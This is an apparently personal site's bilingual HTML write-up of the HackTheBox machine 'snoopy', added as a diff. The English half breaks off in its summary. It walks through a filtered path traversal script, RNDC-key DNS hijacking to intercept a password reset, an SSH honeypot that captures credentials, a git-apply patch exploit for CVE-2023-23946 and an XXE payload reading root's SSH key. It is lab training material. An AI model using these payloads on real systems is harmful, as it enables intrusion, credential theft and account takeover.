@@ -1,0 +1,1000 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>snoopy | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Volver al inicio">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Cambiar tema">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Cambiar idioma">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">snoopy</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La explotación comenzó identificando un path traversal filtrado en el endpoint <code>/download</code> que requería una sintaxis especial con doble punto-barra (<code>....//</code>) para evadir las restricciones. Mediante este path traversal, extraje la clave RNDC del servidor DNS Bind, lo que me permitió modificar registros DNS de forma dinámica.</p>
+                    
+                    <p>Aprovechando que el servicio de correo <code>mail.snoopy.htb</code> estaba en migración, actualicé el registro DNS A de este dominio para que apuntara a mi máquina atacante. Monté un servidor SMTP falso y utilicé la funcionalidad de restablecimiento de contraseña del Mattermost para interceptar el correo de reinicio, obteniendo acceso al panel de administración como el usuario <code>cbrown</code>.</p>
+                    
+                    <p>Una vez dentro del Mattermost, descubrí un comando de aprovisionamiento de servidores que intentaba conectarse por SSH a un puerto específico. Configuré un honeypot SSH que capturó las credenciales del usuario <code>cbrown</code>, permitiéndome acceder al sistema vía SSH. Desde allí, identifiqué permisos sudo para ejecutar <code>git apply</code> como el usuario <code>sbrown</code>.</p>
+                    
+                    <p>Exploté CVE-2023-23946, una vulnerabilidad de path traversal en Git que permite escribir archivos fuera del repositorio actual mediante archivos patch maliciosos. Creé un enlace simbólico al directorio <code>.ssh</code> de sbrown y utilicé un patch especialmente diseñado para inyectar mi clave pública SSH en <code>authorized_keys</code>, ganando acceso como sbrown.</p>
+                    
+                    <p>Para la escalada final a root, aproveché los permisos sudo de sbrown para ejecutar <code>clamscan</code> con el flag <code>--debug</code>. La versión de ClamAV instalada (1.0.0) era vulnerable a CVE-2023-20052, un XXE (XML External Entity) al parsear archivos DMG. Modifiqué un archivo DMG legítimo inyectando una entidad XXE que leía el archivo <code>/root/.ssh/id_rsa</code>, permitiéndome extraer la clave privada SSH de root y obtener acceso completo al sistema.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Path traversal filtrado con scripting, Bind DNS RNDC key abuse, DNS zone hijacking, SMTP server hijacking con aiosmtpd, Mattermost password reset bypass, SSH honeypot para credential harvesting, Git apply path traversal (CVE-2023-23946), ClamAV XXE arbitrary file read (CVE-2023-20052).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en ejecución:</p>
+                <p><img src="./media/image11.png" alt="Escaneo de nmap mostrando puertos abiertos incluyendo DNS en el 53, HTTP en el 80 y otros servicios" /></p>
+
+                <p>El escaneo revela varios servicios interesantes. Lo que más me llama la atención es que el puerto 53 (DNS) está abierto, lo cual es inusual en una máquina típica de HackTheBox. Además, en la página de contacto del sitio web encuentro este mensaje significativo:</p>
+
+                <blockquote>
+                    <p>"Attention: As we migrate DNS records to our new domain please be advised that our mailserver 'mail.snoopy.htb' is currently offline."</p>
+                </blockquote>
+
+                <p>Este mensaje sugiere que están en proceso de migración DNS y que el servidor de correo está temporalmente fuera de servicio, lo cual podría ser relevante más adelante.</p>
+
+                <h2>Enumeración Web Inicial</h2>
+                <p>Al intentar usar el formulario de contacto en la página web, veo este mensaje de error:</p>
+                <p><img src="./media/image10.png" alt="Mensaje de error en el formulario de contacto indicando problemas con el servicio de correo" /></p>
+
+                <p>Añado los dominios <code>snoopy.htb</code> y <code>mail.snoopy.htb</code> al archivo <code>/etc/hosts</code>. Durante la enumeración de la web, identifico varios usuarios potenciales del sistema:</p>
+                <p><img src="./media/image3.png" alt="Lista de usuarios encontrados en la página web" /></p>
+
+                <p>Ejecuto gobuster para enumerar directorios y encuentro una ruta interesante: <code>/download</code></p>
+                <p><img src="./media/image9.png" alt="Resultados de gobuster mostrando el directorio /download" /></p>
+
+                <p>Al acceder a esta ruta, se descarga un archivo ZIP que contiene un PDF y un MP4, aunque estos archivos no proporcionan información útil de inmediato.</p>
+
+                <h2>Descubrimiento de Virtual Hosts</h2>
+                <p>Ejecuto un escaneo de virtual hosts con gobuster y descubro uno adicional:</p>
+                <p><img src="./media/image6.png" alt="Virtual host mm.snoopy.htb descubierto con gobuster" /></p>
+
+                <p>Añado <code>mm.snoopy.htb</code> al <code>/etc/hosts</code> y al acceder descubro que es una instancia de Mattermost. Para los que no estén familiarizados, Mattermost es una plataforma de comunicación de equipo de código abierto y auto-hospedada, similar a Slack.</p>
+
+                <p>La página presenta un formulario de inicio de sesión para el cual no tengo credenciales, pero también ofrece una funcionalidad de restablecimiento de contraseña mediante correo electrónico. Al intentar restablecer una contraseña, recibo este mensaje:</p>
+                <p><img src="./media/image13.png" alt="Mensaje indicando que se ha enviado un correo de restablecimiento de contraseña" /></p>
+
+                <p>El mensaje confirma que se ha enviado un correo, pero probablemente no lo recibiré debido a la migración DNS mencionada anteriormente. Esto me da una idea para más adelante.</p>
+
+                <h2>Enumeración DNS - Zone Transfer</h2>
+                <p>Dado que el puerto 53 está abierto, intento realizar un DNS Zone Transfer para obtener información sobre los registros DNS:</p>
+
+                <pre><code class="language-bash">dig @10.10.11.212 snoopy.htb AXFR</code></pre>
+
+                <p>El comando tiene éxito y revela varios registros interesantes:</p>
+
+                <pre><code class="language-plaintext">snoopy.htb.            86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
+snoopy.htb.            86400   IN      NS      ns1.snoopy.htb.
+snoopy.htb.            86400   IN      NS      ns2.snoopy.htb.
+mattermost.snoopy.htb. 86400   IN      A       172.18.0.3
+mm.snoopy.htb.         86400   IN      A       127.0.0.1
+ns1.snoopy.htb.        86400   IN      A       10.0.50.10
+ns2.snoopy.htb.        86400   IN      A       10.0.51.10
+postgres.snoopy.htb.   86400   IN      A       172.18.0.2
+provisions.snoopy.htb. 86400   IN      A       172.18.0.4
+www.snoopy.htb.        86400   IN      A       127.0.0.1</code></pre>
+
+                <p>Las direcciones IP en el rango <code>172.18.0.x</code> sugieren servicios dockerizados. Los subdominios <code>provisions</code> y <code>postgres</code> son particularmente interesantes ya que son nuevos para mí.</p>
+
+                <h2>Path Traversal - Análisis y Explotación</h2>
+                <p>Volviendo a la enumeración web, examino más de cerca la ruta de descarga. Encuentro que se accede mediante un parámetro de archivo en la URL:</p>
+
+                <pre><code class="language-plaintext">http://snoopy.htb/download?file=announcement.pdf</code></pre>
+
+                <p>Esto me hace sospechar de un posible path traversal. Intento una carga útil estándar:</p>
+
+                <pre><code class="language-bash">curl http://snoopy.htb/download?file=../../../../../../../../../../../../../../../../../../etc/passwd</code></pre>
+
+                <p>Sin embargo, esto devuelve un output vacío, lo que sugiere que hay algún tipo de filtrado o sanitización en funcionamiento.</p>
+
+                <h3>Fuzzing para Identificar el Filtro</h3>
+                <p>Para confirmar si existe un path traversal y entender cómo está filtrado, ejecuto fuzzing con ffuf:</p>
+
+                <pre><code class="language-bash">ffuf -u http://snoopy.htb/download?file=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc all -ac</code></pre>
+
+                <p>El fuzzing confirma que existe path traversal, pero con una sintaxis diferente. Parece que el filtro elimina secuencias <code>../</code> simples, pero no maneja correctamente la secuencia <code>....//</code>. Cuando se procesa, <code>....//</code> se convierte efectivamente en <code>../</code> después de la sanitización.</p>
+
+                <p>Pruebo con la sintaxis modificada:</p>
+
+                <pre><code class="language-bash">curl -o- http://snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd</code></pre>
+
+                <p>Esto devuelve datos, pero hay un problema: el contenido viene en formato ZIP comprimido en lugar de texto plano. Para facilitar la explotación, creo un script Python que automatiza el proceso de descarga, descompresión y extracción:</p>
+
+                <pre><code class="language-python">#!/usr/bin/env python3
+
+import requests
+import sys
+import zipfile
+from io import BytesIO
+
+if len(sys.argv) < 2:
+    print(f"usage: {sys.argv[0]} [full path of file]")
+    sys.exit()
+
+fpath = sys.argv[1]
+outfile = sys.argv[2] if len(sys.argv) > 2 else None
+
+resp = requests.get(f'http://snoopy.htb/download?file=....//....//....//....//....//{fpath}')
+
+if len(resp.content) == 0:
+    print(f"File not found: {fpath}")
+    sys.exit()
+
+with zipfile.ZipFile(BytesIO(resp.content)) as zip_file:
+    file_path_in_zip = zip_file.namelist()[0]
+    with zip_file.open(file_path_in_zip) as file:
+        contents = file.read()
+        if outfile:
+            with open(outfile, 'wb') as f:
+                f.write(contents)
+            print(f"Results written to {outfile}")
+        else:
+            print(contents.decode())</code></pre>
+
+                <p>Ahora puedo extraer archivos fácilmente. Por ejemplo, para obtener los usuarios del sistema:</p>
+
+                <pre><code class="language-bash">python3 openzip.py /etc/passwd | grep bash</code></pre>
+
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
+sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
+lpelt:x:1003:1004::/home/lpelt:/bin/bash
+cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
+vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash</code></pre>
+
+                <p>Estos usuarios se corresponden con los nombres que vi anteriormente en la página web.</p>
+
+                <h2>Extracción de la Clave RNDC</h2>
+                <p>Bind es el servicio DNS más popular en sistemas Linux. Utilizo el path traversal para extraer el archivo de configuración de Bind:</p>
+
+                <pre><code class="language-bash">python3 openzip.py /etc/bind/named.conf</code></pre>
+
+                <p>En la configuración encuentro una clave RNDC (Remote Name Daemon Control) crítica:</p>
+
+                <pre><code class="language-plaintext">key "rndc-key" {
+    algorithm hmac-sha256;
+    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
+};</code></pre>
+
+                <p>Esta clave permite realizar modificaciones dinámicas al servicio DNS, lo cual es exactamente lo que necesito para mi siguiente paso.</p>
+
+                <h2>DNS Hijacking - Redirigiendo el Servidor de Correo</h2>
+                <p>Mi estrategia es la siguiente: dado que sé que hay aplicaciones que intentan enviar correos a <code>mail.snoopy.htb</code> y que este servicio está actualmente offline debido a la migración, puedo modificar el registro DNS de <code>mail.snoopy.htb</code> para que apunte a mi máquina. Así podré interceptar los correos electrónicos.</p>
+
+                <p>Según la documentación de Bind (<a href="https://bind9.readthedocs.io/en/v9_16_22/advanced.html#tsig">TSIG</a>), puedo usar la herramienta <code>nsupdate</code> para actualizar registros DNS de forma dinámica.</p>
+
+                <h3>Preparando la Actualización DNS</h3>
+                <p>Primero, guardo la clave RNDC en un archivo llamado <code>rndc.key</code>:</p>
+
+                <pre><code class="language-plaintext">key "rndc-key" {
+    algorithm hmac-sha256;
+    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
+};</code></pre>
+
+                <p>Luego creo un archivo <code>mail_dns.txt</code> con los comandos de actualización DNS:</p>
+
+                <pre><code class="language-plaintext">server 10.10.11.212
+zone snoopy.htb
+update add mail.snoopy.htb 86400 IN A 10.10.16.2
+send</code></pre>
+
+                <p>Estos comandos especifican el servidor DNS objetivo, la zona a modificar, el nuevo registro A para <code>mail.snoopy.htb</code> apuntando a mi dirección IP, y finalmente envían la actualización.</p>
+
+                <p>Ejecuto la actualización:</p>
+
+                <pre><code class="language-bash">nsupdate -k rndc.key mail_dns.txt</code></pre>
+
+                <p>Verifico que el cambio se haya aplicado correctamente:</p>
+
+                <pre><code class="language-bash">dig mail.snoopy.htb +noall +answer @10.10.11.212</code></pre>
+
+                <pre><code class="language-plaintext">mail.snoopy.htb.    86400   IN      A       10.10.16.2</code></pre>
+
+                <p>¡Perfecto! Ahora <code>mail.snoopy.htb</code> resuelve a mi máquina atacante.</p>
+
+                <h2>Configurando el Servidor SMTP Falso</h2>
+                <p>Ahora necesito montar un servidor SMTP en mi máquina para recibir los correos electrónicos. Utilizaré el módulo <code>aiosmtpd</code> de Python, que proporciona un servidor SMTP simple similar a cómo <code>http.server</code> proporciona un servidor HTTP.</p>
+
+                <p>Primero, otorgo a Python la capacidad de escuchar en puertos privilegiados (por debajo de 1024):</p>
+
+                <pre><code class="language-bash">sudo setcap cap_net_bind_service=ep /usr/bin/python3.13</code></pre>
+
+                <p>Creo un entorno virtual e instalo el módulo necesario:</p>
+
+                <pre><code class="language-bash">python3 -m venv venv
+source venv/bin/activate
+pip3 install aiosmtpd</code></pre>
+
+                <p>Finalmente, inicio el servidor SMTP en el puerto 25:</p>
+
+                <pre><code class="language-bash">python -m aiosmtpd -n -l 0.0.0.0:25</code></pre>
+
+                <h2>Acceso al Mattermost - Password Reset</h2>
+                <p>Con mi servidor SMTP falso en funcionamiento y el DNS apuntando a mi máquina, voy a la página de Mattermost y solicito un restablecimiento de contraseña para el usuario <code>cbrown@snoopy.htb</code>:</p>
+                <p><img src="./media/image5.png" alt="Formulario de restablecimiento de contraseña de Mattermost para cbrown@snoopy.htb" /></p>
+
+                <p>Mi servidor SMTP recibe el correo electrónico con una URL de restablecimiento de contraseña:</p>
+
+                <pre><code class="language-plaintext">http://mm.snoopy.htb/reset_password_complete?token=3Dob8pf=
+mfin8hu18hdxjrfdq96nj6g137srigycdzhort4ziurndmree9dig6re6ia</code></pre>
+
+                <p>Sin embargo, al intentar usar este token directamente, encuentro un problema:</p>
+                <p><img src="./media/image7.png" alt="Error al intentar usar el token de restablecimiento de contraseña sin decodificar" /></p>
+
+                <h3>Decodificando el Token - Quoted-Printable Encoding</h3>
+                <p>El problema es que el correo electrónico se recibe en texto plano con codificación Quoted-Printable, que es un estándar de codificación de correo electrónico. En esta codificación:</p>
+                <ul>
+                    <li><code>=3D</code> representa el carácter <code>=</code></li>
+                    <li>Un <code>=</code> al final de una línea indica simplemente un salto de línea suave (line break) que debe ignorarse</li>
+                </ul>
+
+                <p>Decodifico el token manualmente:
+                <ul>
+                    <li>Elimino el <code>=3D</code> al inicio (que es un <code>=</code>)</li>
+                    <li>Elimino el <code>=</code> después de <code>...8pf</code> (que es solo un line break)</li>
+                </ul>
+                </p>
+
+                <p>El token corregido queda así:</p>
+
+                <pre><code class="language-plaintext">ob8pfmfin8hu18hdxjrfdq96nj6g137srigycdzhort4ziurndmree9dig6re6ia</code></pre>
+
+                <p>Ahora puedo acceder a la página de restablecimiento de contraseña y establecer una nueva contraseña para el usuario cbrown:</p>
+                <p><img src="./media/image1.png" alt="Formulario de cambio de contraseña funcionando correctamente con el token decodificado" /></p>
+
+                <p>¡Perfecto! Ahora tengo acceso al Mattermost como cbrown.</p>
+
+                <h2>Explorando Mattermost</h2>
+                <p>Una vez dentro, identifico las versiones del software en ejecución:</p>
+
+                <pre><code class="language-plaintext">Mattermost Version: 7.9.0
+Database Schema Version: 104
+Database: postgres</code></pre>
+
+                <p>En los canales de chat, veo conversaciones sobre un antivirus de Linux (ClamAV) y referencias a un canal de aprovisionamiento (provisioning). Encuentro un canal llamado "provisioning" que tiene comandos slash personalizados disponibles.</p>
+
+                <p>Al explorar los comandos slash usando <code>/</code>, descubro uno llamado "server provisioning" que presenta este formulario modal:</p>
+                <p><img src="./media/image14.png" alt="Modal de aprovisionamiento de servidor solicitando hostname, puerto SSH y clave" /></p>
+
+                <h2>SSH Honeypot - Capturando Credenciales</h2>
+                <p>El formulario solicita un hostname, puerto SSH y una clave. Primero pruebo configurando un listener básico de netcat en el puerto 2222:</p>
+
+                <pre><code class="language-bash">sudo nc -lvnp 2222</code></pre>
+
+                <p>Después de enviar el formulario, recibo una conexión SSH:</p>
+
+                <pre><code class="language-plaintext">listening on [any] 2222 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.212] 56464
+SSH-2.0-paramiko_3.1.0</code></pre>
+
+                <p><img src="./media/image8.png" alt="Conexión SSH entrante mostrando la versión de paramiko" /></p>
+
+                <p>Esto confirma que el sistema está intentando conectarse por SSH a mi máquina, probablemente con credenciales almacenadas. Para capturar estas credenciales, necesito un servidor SSH honeypot real que pueda registrar los intentos de autenticación.</p>
+
+                <h3>Implementando el Honeypot</h3>
+                <p>Creo un script Python que implementa un servidor SSH honeypot básico usando la biblioteca Paramiko. El script acepta conexiones SSH pero rechaza las autenticaciones después de registrar las credenciales proporcionadas.</p>
+
+                <p>Ejecuto el honeypot:</p>
+
+                <pre><code class="language-bash">python3 sshhoneypot.py</code></pre>
+
+                <pre><code class="language-plaintext">2025-12-14 14:40:33,648 - SSH Honeypot started on 0.0.0.0:2222
+2025-12-14 14:40:33,648 - Waiting for connections...
+2025-12-14 14:40:57,794 - Connection from 10.10.11.212:40680
+2025-12-14 14:40:57,795 - Generating new RSA host key...
+2025-12-14 14:40:57,865 - Connected (version 2.0, client paramiko_3.1.0)
+2025-12-14 14:40:58,611 - Login attempt from 10.10.11.212 - Username: cbrown, Password: sn00pedcr3dential!!!
+2025-12-14 14:40:58,611 - Auth rejected (password).</code></pre>
+
+                <p>¡Excelente! He capturado credenciales válidas:</p>
+
+                <pre><code class="language-plaintext">cbrown:sn00pedcr3dential!!!</code></pre>
+
+                <h2>Acceso Inicial SSH</h2>
+                <p>Con estas credenciales, me conecto al sistema por SSH:</p>
+
+                <pre><code class="language-bash">ssh cbrown@10.10.11.212</code></pre>
+
+                <p>¡Acceso concedido! Estoy dentro del sistema como el usuario cbrown.</p>
+
+                <h2>Enumeración como cbrown</h2>
+                <p>Después de obtener acceso, lo primero que hago es verificar los privilegios sudo disponibles:</p>
+
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">Matching Defaults entries for cbrown on snoopy:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User cbrown may run the following commands on snoopy:
+    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$</code></pre>
+
+                <p>Esto indica que puedo ejecutar <code>git apply -v</code> como el usuario sbrown, pero con una expresión regular que restringe el nombre del archivo a caracteres alfanuméricos y puntos.</p>
+
+                <p>En el <code>/home</code> del sistema encuentro dos usuarios: <code>cbrown</code> y <code>sbrown</code>. Busco repositorios Git en el sistema pero no encuentro ninguno inicialmente:</p>
+
+                <pre><code class="language-bash">find / -type d -name .git 2>/dev/null</code></pre>
+
+                <h2>CVE-2023-23946 - Git Apply Path Traversal</h2>
+                <p>Verifico la versión de Git instalada:</p>
+
+                <pre><code class="language-bash">git --version</code></pre>
+
+                <pre><code class="language-plaintext">git version 2.34.1</code></pre>
+
+                <p>Esta versión es vulnerable a CVE-2023-23946, un path traversal en <code>git apply</code> que permite escribir archivos fuera del directorio de trabajo actual del repositorio. El exploit abusa de cómo Git maneja los enlaces simbólicos cuando se renombran en archivos patch.</p>
+
+                <p>Encuentro una prueba de concepto útil en: <a href="https://github.com/bruno-1337/CVE-2023-23946-POC">https://github.com/bruno-1337/CVE-2023-23946-POC</a></p>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>La vulnerabilidad funciona de la siguiente manera:</p>
+                <ol>
+                    <li>Creo un enlace simbólico que apunta al directorio <code>.ssh</code> del usuario objetivo (sbrown)</li>
+                    <li>Hago commit del enlace simbólico en un repositorio Git</li>
+                    <li>Creo un archivo patch que primero renombra el enlace simbólico y luego crea un nuevo archivo dentro de ese enlace simbólico "renombrado"</li>
+                    <li>Cuando Git procesa el patch, debido a un fallo en el manejo de path traversal, termina escribiendo el archivo en la ubicación real a la que apunta el enlace simbólico, no en el directorio de trabajo</li>
+                </ol>
+
+                <h3>Explotación Paso a Paso</h3>
+                <p>Creo un directorio de trabajo temporal y comienzo la explotación:</p>
+
+                <pre><code class="language-bash">cd /tmp
+mkdir exploit
+cd exploit</code></pre>
+
+                <p><strong>Paso 1:</strong> Creo un enlace simbólico al directorio .ssh de sbrown:</p>
+
+                <pre><code class="language-bash">ln -s /home/sbrown/.ssh symlink</code></pre>
+
+                <p><strong>Paso 2:</strong> Inicializo un repositorio Git:</p>
+
+                <pre><code class="language-bash">git init</code></pre>
+
+                <p><strong>Paso 3:</strong> Añado y hago commit del enlace simbólico:</p>
+
+                <pre><code class="language-bash">git add symlink
+git commit -m "commit"</code></pre>
+
+                <p><strong>Paso 4:</strong> Creo el archivo patch malicioso llamado <code>xploit.patch</code>:</p>
+
+                <pre><code class="language-diff">diff --git a/symlink b/rn-symlink
+rename from symlink
+rename to rn-symlink
+--
+diff --git /dev/null b/rn-symlink/authorized_keys
+new file mode 100644
+index 0000000..e47f4ea
+--- /dev/null
++++ b/rn-symlink/authorized_keys
+@@ -0,0 +1,1 @@
++ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINaRz0/4BTr6JaFNeVYUvYqjewZLVyGvYKaj+2Z08nJw xd@xd.com</code></pre>
+
+                <p>Este patch hace dos cosas:</p>
+                <ul>
+                    <li>Primero, renombra el enlace simbólico de <code>symlink</code> a <code>rn-symlink</code></li>
+                    <li>Segundo, crea un nuevo archivo <code>authorized_keys</code> dentro de <code>rn-symlink/</code> con mi clave pública SSH</li>
+                </ul>
+
+                <p>La clave pública que incluyo es de un par de claves SSH que he generado previamente en mi máquina local:</p>
+
+                <pre><code class="language-bash">ssh-keygen -t ed25519 -f id_ed25519</code></pre>
+
+                <p><strong>Paso 5:</strong> Ejecuto el exploit usando sudo para aplicar el patch como sbrown:</p>
+
+                <pre><code class="language-bash">sudo -u sbrown git apply -v xploit.patch</code></pre>
+
+                <p>Debido al path traversal, Git termina escribiendo el archivo <code>authorized_keys</code> en <code>/home/sbrown/.ssh/authorized_keys</code> en lugar de en el directorio de trabajo actual.</p>
+
+                <p><strong>Paso 6:</strong> Me conecto como sbrown usando mi clave privada:</p>
+
+                <pre><code class="language-bash">ssh -i id_ed25519 sbrown@snoopy.htb</code></pre>
+
+                <p>¡Éxito! Ahora tengo acceso como el usuario sbrown y puedo recuperar la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios a Root</h2>
+                <p>Como sbrown, verifico nuevamente los permisos sudo:</p>
+
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">Matching Defaults entries for sbrown on snoopy:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User sbrown may run the following commands on snoopy:
+    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$</code></pre>
+
+                <p>Puedo ejecutar <code>clamscan</code> con el flag <code>--debug</code> como root, pero solo en archivos dentro del directorio <code>/home/sbrown/scanfiles/</code> con nombres que coincidan con el patrón especificado.</p>
+
+                <p>Verifico la versión de ClamAV instalada:</p>
+
+                <pre><code class="language-bash">clamscan --version</code></pre>
+
+                <pre><code class="language-plaintext">ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023</code></pre>
+
+                <h2>CVE-2023-20052 - ClamAV XXE Arbitrary File Read</h2>
+                <p>Esta versión de ClamAV es vulnerable a varias CVEs. Las que me interesan son:</p>
+                <ul>
+                    <li><a href="https://security-tracker.debian.org/tracker/CVE-2023-20032">CVE-2023-20032</a> - Ejecución remota de código</li>
+                    <li><a href="https://security-tracker.debian.org/tracker/CVE-2023-20052">CVE-2023-20052</a> - Lectura arbitraria de archivos mediante XXE</li>
+                </ul>
+
+                <p>La primera es RCE pero no encuentro una PoC viable y parece difícil de explotar. Para la segunda, encuentro este exploit: <a href="https://github.com/nokn0wthing/CVE-2023-20052">https://github.com/nokn0wthing/CVE-2023-20052</a></p>
+
+                <h3>Entendiendo CVE-2023-20052</h3>
+                <p>Esta vulnerabilidad explota un XXE (XML External Entity) en el parser XML de ClamAV cuando procesa archivos DMG (Apple Disk Image) con el flag <code>--debug</code> habilitado. Los archivos DMG contienen XML interno que describe la estructura del disco, y ClamAV parsea este XML sin desactivar adecuadamente las entidades externas.</p>
+
+                <p>La estrategia es:</p>
+                <ol>
+                    <li>Conseguir un archivo DMG legítimo</li>
+                    <li>Modificar el XML interno del DMG para inyectar una entidad XXE que lea un archivo del sistema</li>
+                    <li>Hacer que ClamAV escanee el archivo con <code>--debug</code></li>
+                    <li>La salida de debug revelará el contenido del archivo leído</li>
+                </ol>
+
+                <h3>Preparando el Exploit</h3>
+                <p>Descargo un archivo DMG legítimo desde: <a href="https://macdownload.informer.com/notepad/download/#downloading">https://macdownload.informer.com/notepad/download/#downloading</a></p>
+
+                <p>Uso la herramienta <code>ghex</code> (un editor hexadecimal) para modificar el contenido XML dentro de <code>notepad.dmg</code>. Busco la sección XML y la modifico para incluir mi payload XXE:</p>
+
+                <p><img src="./media/image4.png" alt="Editor hexadecimal mostrando la inyección de la entidad XXE en el archivo DMG" /></p>
+
+                <p><img src="./media/image2.png" alt="Continuación del editor hexadecimal mostrando la referencia a la entidad XXE" /></p>
+
+                <p>El payload XXE que inyecto tiene esta estructura:</p>
+
+                <pre><code class="language-xml">&lt;!DOCTYPE plist [
+  &lt;!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"&gt;
+]&gt;
+&lt;plist&gt;
+  &lt;key&gt;&amp;xxe;&lt;/key&gt;
+&lt;/plist&gt;</code></pre>
+
+                <p>Esto define una entidad XXE llamada <code>xxe</code> que lee el contenido del archivo <code>/root/.ssh/id_rsa</code>, y luego la referencia dentro de un elemento <code>&lt;key&gt;</code> para que se expanda cuando ClamAV parsee el XML.</p>
+
+                <h3>Ejecutando el Exploit</h3>
+                <p>Transfiero el archivo DMG modificado a la máquina víctima en el directorio <code>/home/sbrown/scanfiles/</code>. Luego ejecuto el escaneo con privilegios de root:</p>
+
+                <pre><code class="language-bash">sudo clamscan --debug /home/sbrown/scanfiles/notepad.dmg</code></pre>
+
+                <p>El output de debug es extenso, pero entre toda la información de depuración, encuentro la clave privada SSH de root:</p>
+
+                <p><img src="./media/image12.png" alt="Output del comando clamscan mostrando la clave privada SSH de root extraída mediante XXE" /></p>
+
+                <p>Copio la clave privada a mi máquina local, la guardo en un archivo llamado <code>id_rsa</code>, y establezco los permisos correctos:</p>
+
+                <pre><code class="language-bash">chmod 600 id_rsa</code></pre>
+
+                <p>Finalmente, me conecto como root usando la clave privada extraída:</p>
+
+                <pre><code class="language-bash">ssh -i id_rsa root@snoopy.htb</code></pre>
+
+                <pre><code class="language-plaintext">Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+root@snoopy:~#</code></pre>
+
+                <p>¡Perfecto! Tengo acceso completo como root y puedo recuperar la flag de root, completando así la máquina.</p>
+            </div>
+
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The exploitation began by identifying a filtered path traversal vulnerability in the <code>/download</code> endpoint that required special syntax with double dot-slash (<code>....//</code>) to bypass restrictions. Through this path traversal, I extracted the RNDC key from the Bind DNS server, which allowed me to dynamically modify DNS records.</p>
+                    
+                    <p>Taking advantage of the mail server <code>mail.snoopy.htb</code> being in migration, I updated the DNS A record for this domain to point to my attacking machine. I set up a fake SMTP server and used Mattermost's password reset functionality to intercept the reset email, gaining access to the admin panel as the user <code>cbrown</code>.</p>
+                    
+                    <p>Once inside Mattermost, I discovered a server provisioning command that attempted to SSH to a specific port. I configured an SSH honeypot that captured the credentials for user <code>cbrown</code>, allowing me to access the system via SSH. From there, I identified sudo permissions to execute <code>git apply</code> as user <code>sbrown</code>.</p>
+                    
+                    <p>I exploited CVE-2023-23946, a path traversal vulnerability in Git that allows writing files outside the current repository through malicious patch files. I created a symbolic link to sbrown's <code>.ssh</code> directory and used a specially crafted patch to inject my SSH public key into <code>authorized_keys</code>, gaining access as sbrown.</p>
+                    
